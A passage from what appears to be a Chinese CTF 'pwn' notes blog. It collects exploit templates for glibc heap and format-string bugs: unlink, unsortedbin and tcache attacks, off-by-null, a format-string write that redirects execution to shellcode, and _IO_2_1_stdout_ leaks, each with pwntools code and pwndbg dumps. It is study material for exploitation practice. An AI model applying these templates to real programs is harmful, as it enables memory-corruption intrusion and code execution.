class="line"></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, mprot_got, <span class="number">7</span>, <span class="number">0x1000</span>, <span class="number">0x600000</span>, main_addr)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, shellcode_got, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, main_addr)</span><br></pre></td></tr></table></figure>
<p>这种进攻方式的核心就在于：把目标地址写入空白的GOT表</p>
<h2 id="Unlink攻击模板"><a href="#Unlink攻击模板" class="headerlink" title="Unlink攻击模板"></a>Unlink攻击模板</h2><p><strong>基于chunk_list</strong></p>
<p>通常就是这么个造型，根据具体需要进行修改（这种方式高libc版本用不了）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0xa0</span>)	<span class="comment">#chunk1</span></span><br><span class="line">alloc(<span class="number">0xa0</span>)	<span class="comment">#chunk2</span></span><br><span class="line">alloc(<span class="number">0xa0</span>)	<span class="comment">#chunk3</span></span><br><span class="line"></span><br><span class="line">list_addr_chunk2=list_addr+<span class="number">0x10</span> </span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0xa0</span>)</span><br><span class="line">payload+=p64(list_addr_chunk2-<span class="number">0x18</span>)</span><br><span class="line">payload+=p64(list_addr_chunk2-<span class="number">0x10</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xa0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0xa0</span>)+p64(<span class="number">0xb0</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">2</span>,<span class="number">0xb0</span>,payload) <span class="comment">#fake_chunk2</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#list_addr_chunk2：就是目标chunk(chunk2)的FD指针，通过list_addr比较好寻找</span></span><br><span class="line"><span class="comment">#注意：例题的&quot;chunk[0]&quot;没有写入东西</span></span><br></pre></td></tr></table></figure>
<p>通常都是修改“chunk2”，释放“chunk3”，留一个“chunk1”进行初始化</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10xg list_addr(buf[<span class="number">0</span>])</span><br><span class="line"><span class="number">0x602140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000e0a020</span></span><br><span class="line"><span class="number">0x602150</span>:	<span class="number">0x0000000000602138</span>	<span class="number">0x0000000000000000</span>	<span class="comment">#fake_chunk2</span></span><br><span class="line"><span class="number">0x602160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="comment">#演示程序的buf[0]没有chunk</span></span><br><span class="line"><span class="comment">#buf[1]为chunk1，用于初始化</span></span><br><span class="line"><span class="comment">#buf[2]为fake_chunk2，是攻击对象</span></span><br><span class="line"><span class="comment">#buf[3]为chunk3，已经被free</span></span><br></pre></td></tr></table></figure>
<p>接下来修改“chunk2”就可以直接修改“list_addr”（“buf[0]”）了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(elf.got[<span class="string">&#x27;target1&#x27;</span>]) <span class="comment">#fake_chunk0</span></span><br><span class="line">payload+=p64(elf.got[<span class="string">&#x27;target2&#x27;</span>]) <span class="comment">#fake_chunk1</span></span><br><span class="line">payload+=p64(elf.got[<span class="string">&#x27;target3&#x27;</span>]) <span class="comment">#fake_chunk2</span></span><br><span class="line">fill(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>
<p>​        // 程序会在“buf[-1]”（buf[2-3]）开始写入数据</p>
<p><strong>基于heap_addr</strong>（泄露“heap_addr”+泄露“libc_base”+后续利用）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak libc_base</span></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">8</span></span><br><span class="line">libc_base=leak_addr-<span class="number">0x3c4b00</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap_addr</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">8</span></span><br><span class="line">heap_addr=leak_addr-<span class="number">240</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;heap_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># unlink for overlapping</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0xb1</span>) <span class="comment"># fake chunk-&gt;size</span></span><br><span class="line">payload+=p64(heap_addr+<span class="number">0x18</span>)+p64(heap_addr+<span class="number">0x20</span>)+p64(heap_addr+<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x40</span>,payload)<span class="comment">#0</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0xb0</span>))<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">2</span>) <span class="comment"># fake chunk-&gt;size=0xb1+0x100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># after unlink</span></span><br><span class="line">add(<span class="number">0xc0</span>,<span class="string">&#x27;AAAA&#x27;</span>)<span class="comment">#2(malloc form unsortedbin &quot;0x40+0x10&quot;+&quot;0x60+0x10&quot;)</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;BBBB&#x27;</span>)<span class="comment">#3(avoid top chunk and adjust the size of unsortedbin)</span></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment"># lead chunk1 to fastbin</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xc0</span>,flat(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x38</span>,<span class="number">0x71</span>,fake_target)) </span><br><span class="line"><span class="comment"># make fake_target to unsortedbin and then to fastbin(0x70)</span></span><br><span class="line">add(<span class="number">0x60</span>,payload) <span class="comment"># malloc the fake_target and change it</span></span><br></pre></td></tr></table></figure>
<ul>
<li>先构造泄露 heap_addr 的结构，再构造泄露 libc_base 的结构</li>
<li>要求 unlink 跳过中间那个chunk，基于这点构造“fake chunk-&gt;size”和“last chunk-&gt;fake presize”</li>
<li>释放chunk1，使chunk1进入fastbin</li>
<li>申请“0x60”字节的目的有二：防止 top chunk 合并，调整 unsortedbin 的大小（使其可以进入fastbin）</li>
<li>申请“0xC0”字节释放后，可以控制已经在fastbin中的chunk1，从而申请到目标地址</li>
</ul>
<h2 id="Unsortedbin-Leak模板"><a href="#Unsortedbin-Leak模板" class="headerlink" title="Unsortedbin Leak模板"></a>Unsortedbin Leak模板</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>, <span class="string">&quot;A&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">&quot;B&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">&quot;C&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">&quot;D&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">delete(<span class="number">3</span>) <span class="comment"># 注意:这里要先释放后申请的chunk,不然程序不会打印(不知道原因)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>chunk1：leak heap_addr</li>
<li>chunk3：leak main_arena</li>
</ul>
<h2 id="格式化字符串漏洞模板"><a href="#格式化字符串漏洞模板" class="headerlink" title="格式化字符串漏洞模板"></a>格式化字符串漏洞模板</h2><p><strong>WAA模板</strong></p>
<p>通常需要在两片内存空间中，最后指向的地址相同（“偏移N”，“偏移M”）</p>
<p>例如：实现“ 目标地址 =&gt; shellcode ”</p>
<ul>
<li>找寻：最后指向地址相同的两片空间（“偏移N”，“偏移M”）</li>
<li>把“目标地址”写入“偏移N”</li>
<li>对应的“偏移M”最终也会指向“目标地址”</li>
<li>把“shellcode”写入“偏移M”（其实就是把“shellcode”写入“目标地址”了）</li>
</ul>
<p>通常需要分段写入地址，先写入高地址，所以模板为：（每次修改2字节）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%N$hn\n&quot;</span>.<span class="built_in">format</span>(target_addr_in_stack + <span class="number">6</span>) <span class="comment"># last 6~8</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%M$hn\n&quot;</span>.<span class="built_in">format</span>((shellcode_addr &gt;&gt; <span class="number">16</span>*<span class="number">3</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%N$hn\n&quot;</span>.<span class="built_in">format</span>(target_addr_in_stack + <span class="number">4</span>) <span class="comment"># last 4~6</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%M$hn\n&quot;</span>.<span class="built_in">format</span>((shellcode_addr &gt;&gt; <span class="number">16</span>*<span class="number">2</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%N$hn\n&quot;</span>.<span class="built_in">format</span>(target_addr_in_stack + <span class="number">2</span>) <span class="comment"># last 2~4</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%M$hn\n&quot;</span>.<span class="built_in">format</span>((shellcode_addr &gt;&gt; <span class="number">16</span>*<span class="number">1</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%N$hn\n&quot;</span>.<span class="built_in">format</span>(target_addr_in_stack) <span class="comment"># last 0~2</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%M$hn\n&quot;</span>.<span class="built_in">format</span>(shellcode_addr &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
<p><strong>leak模板</strong></p>
<p>格式化字符串的 leak 很简单，只需要输入若干“-%p”，并在GDB中确认格式化参数的地址后，就可以计算出各个地址的偏移了</p>
<p>​        // 前6个是寄存器中存放的值（在stack中也有），后续的信息才是重点</p>
<p>实现 leak 了之后，首先需要寻找“最后指向地址相同”的内存空间，方便以后的 WAA</p>
<h2 id="Tcache-Attack-模板"><a href="#Tcache-Attack-模板" class="headerlink" title="Tcache Attack 模板"></a>Tcache Attack 模板</h2><p>Tcache Attack的形式多种多样，遇到一个记录一个</p>
<p><strong>Tcache leak</strong></p>
<p>如果程序拥有“打印模块”，就先可以填满 Tcachebin，然后打 Unsortedbin leak</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">9</span>):</span><br><span class="line">	add(i,<span class="number">0x100</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">7</span>):</span><br><span class="line">	delete(i)</span><br><span class="line">	</span><br><span class="line">delete(<span class="number">7</span>) <span class="comment"># chunk8 into Unsortedbin </span></span><br></pre></td></tr></table></figure>
<p>申请9个chunk：7个填Tcachebin，1个leak，1个防止和合并Top chunk</p>
<p><strong>Tcache dup</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">delete(index)</span><br><span class="line">edit(index,<span class="string">&quot;\x00&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete(index)</span><br><span class="line"></span><br><span class="line">edit(index,p64(target))</span><br><span class="line">add(size)</span><br><span class="line">add(size) <span class="comment"># malloc the target</span></span><br></pre></td></tr></table></figure>
<ul>
<li>释放 chunk ，覆盖 “chunk-&gt;FD，chunk-&gt;BK” 为“\x00” ，再次释放</li>
<li>利用修改模块覆写上 target</li>
<li>连续两次申请获取 target</li>
</ul>
<p><strong>Tcache perthread corruption</strong></p>
<p>一，打 count 获取 unsorted chunk：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">delete(index) <span class="comment"># Tcache dup</span></span><br><span class="line">edit(index,<span class="string">&quot;\x00&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete(index)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;\x00&quot;</span>*<span class="number">0x48</span> + p64(<span class="number">0x0007000000000000</span>) <span class="comment"># cover count to &#x27;7&#x27;</span></span><br><span class="line"></span><br><span class="line">edit(index,p64(heap_base + <span class="number">0x10</span>)) <span class="comment"># tcache_perthread_struct-&gt;next</span></span><br><span class="line">add(size)</span><br><span class="line">add(size,payload) <span class="comment"># malloc the tcache_perthread_struct</span></span><br><span class="line">delete(index)</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：tcache-&gt;next 和常规的FD指针相似但不同，FD指向 nextchunk-&gt;presize ，而 next 指向 nextchunk-&gt;next </li>
<li>利用 Tcache dup 申请到“tcache_perthread_struct”（第一个chunk）</li>
<li>修改对应“tcache_perthread_struct-&gt;size”的“count”为“7”（偏移可以在GDB中看）</li>
<li>释放“tcache_perthread_struct”使其进入“unsortedbin”</li>
</ul>
<p>二，打 tcache_entry 劫持 tcachebin：</p>
<p>这个很灵活，不好用代码表示，这里我挂上几个堆风水：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, p16(<span class="built_in">stdout</span>))</span><br><span class="line">add(<span class="number">0x58</span>, p64(<span class="number">0xfdad2887</span> | <span class="number">0x1000</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + b<span class="string">&quot;\x00&quot;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x558b1cfcd000</span></span><br><span class="line"><span class="number">0x558b1cfcd000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span> <span class="comment">// add</span></span><br><span class="line"><span class="number">0x558b1cfcd010</span>:	<span class="number">0x0001000200000000</span>	<span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x558b1cfcd020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span> <span class="comment">// add</span></span><br><span class="line"><span class="number">0x558b1cfcd060</span>:	<span class="number">0x0000000558b1ce3c</span>	<span class="number">0x0000558b1cfcd010</span> <span class="comment">// delete</span></span><br><span class="line"><span class="number">0x558b1cfcd070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd0a0</span>:	<span class="number">0x0000558b1cfcd0b0</span>	<span class="number">0x0000558b1cfcd060</span> <span class="comment">// &#x27;0x40&#x27;的tcache</span></span><br><span class="line">    		<span class="comment">/* 伪造&#x27;0x40&#x27;的tcache(带有main_arena) */</span> </span><br><span class="line"><span class="number">0x558b1cfcd0b0</span>:	<span class="number">0x00007fea097ddc00</span>	<span class="number">0x00007fea097ddc00</span> <span class="comment">// &#x27;0x60&#x27;的tcache</span></span><br><span class="line">    		<span class="comment">/* 这里曾经是unsortedbin,所以main_arena留下来了 */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x40</span> [  <span class="number">2</span>]: <span class="number">0x558b1cfcd0b0</span> ◂— <span class="number">0x7fef51cc13cd</span></span><br><span class="line"><span class="number">0x50</span> [  <span class="number">1</span>]: <span class="number">0x558b1cfcd060</span> ◂— <span class="number">0x1f1</span> </span><br><span class="line"><span class="number">0x60</span> [  <span class="number">1</span>]: <span class="number">0x7fea097ddc00</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x558ce25c44cd</span></span><br></pre></td></tr></table></figure>
<ul>
<li>注意：因为 tcache 的性质，在对应“size的tcache”中写入地址，就会申请这个地址作为“tcache-&gt;next”（也就是说，数据会直接写入该地址）</li>
<li>关键在于：使 <code>&#39;0x40&#39; tcache</code> 中装有 <code>&#39;0x50&#39; tcache addr</code> ，使其可以通过申请“0x30”来修改 <code>&#39;0x50&#39; tcache</code> 的地址（劫持大小为“0x50”的tcachebin）</li>
</ul>
<h2 id="Off-By-Null模板（基于read）"><a href="#Off-By-Null模板（基于read）" class="headerlink" title="Off-By-Null模板（基于read）"></a>Off-By-Null模板（基于read）</h2><p>有些程序为了“打印模块”的安全性，会在read完成后加一个“\x00”，造成了off-by-null</p>
<p>例如：<em>( </em>(&amp;list + index)  + read(0, *(&amp;list + index) , size) ) = 0 </p>
<p><strong>有Tcache：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">11</span>):</span><br><span class="line">	add(i, <span class="number">0xF8</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0xF0</span>+<span class="string">&quot;b&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">10</span>):</span><br><span class="line">	delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0xF0</span> + p64(<span class="number">0x200</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x70</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x70</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>覆盖前：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x55a67dfb3450</span>:	<span class="number">0x6262626262626262</span>	<span class="number">0x0000000000000101</span> # chunk2(allocated)</span><br><span class="line"><span class="number">0x55a67dfb3460</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55a67dfb3470</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br></pre></td></tr></table></figure>
<p>覆盖后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x561f0e5bf450</span>:	<span class="number">0x0000000000000200</span>	<span class="number">0x0000000000000100</span> # chunk2(allocated)</span><br><span class="line"><span class="number">0x561f0e5bf460</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x561f0e5bf470</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br></pre></td></tr></table></figure>
<p>导致程序误以为chunk0(free)是chunk2相邻的上一个chunk，在释放chunk2后，会导致chunk0，chunk1，chunk2，三者合并为free_chunk</p>
<p>两次申请“0x80”大小的chunk后，free_chunk刚好和chunk1_old重合，把“arena_main + xx”写入chunk1_old，这之后就可以利用“打印模块”进行泄露了</p>
<h2 id="IO-2-1-stdout-Leak-模板"><a href="#IO-2-1-stdout-Leak-模板" class="headerlink" title="IO_2_1_stdout Leak 模板"></a>IO_2_1_stdout Leak 模板</h2><p><strong>基于 Double free</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span>	</span><br><span class="line">    <span class="comment"># lead target to chunk2</span></span><br><span class="line">    add(<span class="number">0x60</span>) <span class="comment"># chunk0</span></span><br><span class="line">	add(<span class="number">0x90</span>) <span class="comment"># chunk1</span></span><br><span class="line">	add(<span class="number">0x60</span>) <span class="comment"># chunk2</span></span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	_IO_2_1_stdout_s = libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">	add(<span class="number">0x90</span>,p16((<span class="number">2</span> &lt;&lt; <span class="number">12</span>) + ((_IO_2_1_stdout_s-<span class="number">0x43</span>) &amp; <span class="number">0xFFF</span>))) </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Double free to leak libc_base</span></span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	delete(<span class="number">2</span>)</span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	add(<span class="number">0x60</span>,padding) <span class="comment"># cover &quot;chunk0-&gt;FD&quot; to make chunk1 into fastbin</span></span><br><span class="line">	add(<span class="number">0x60</span>) <span class="comment"># can change</span></span><br><span class="line">	add(<span class="number">0x60</span>)</span><br><span class="line">	add(<span class="number">0x60</span>)</span><br><span class="line">	add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x00&#x27;</span>) <span class="comment"># malloc the target</span></span><br><span class="line">	libc_base=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-offset</span><br></pre></td></tr></table></figure>
<ul>
<li>整个过程在循环中进行，有 1/16 的概率可以成功</li>
<li>把 chunk1 放入 unsortedbin 然后覆盖 main_arena 为 target</li>
<li>进行 Double free ，然后覆盖“chunk0-&gt;FD”，使其指向 chunk1</li>
<li>申请 target 修改 <code>_IO_2_1_stdout_</code> 的“flag”为“0xfbad1800”，将后面三个read指针置空，将 <code>_IO_write_base</code> 处的第一个字节改为“0”</li>
</ul>
<p>这里一定是：先覆盖 main_arena ，后 Double free 把它链入 fastbin</p>
<h2 id="FILE结构体模板"><a href="#FILE结构体模板" class="headerlink" title="FILE结构体模板"></a>FILE结构体模板</h2><p>这个模板主要是个函数：</p>
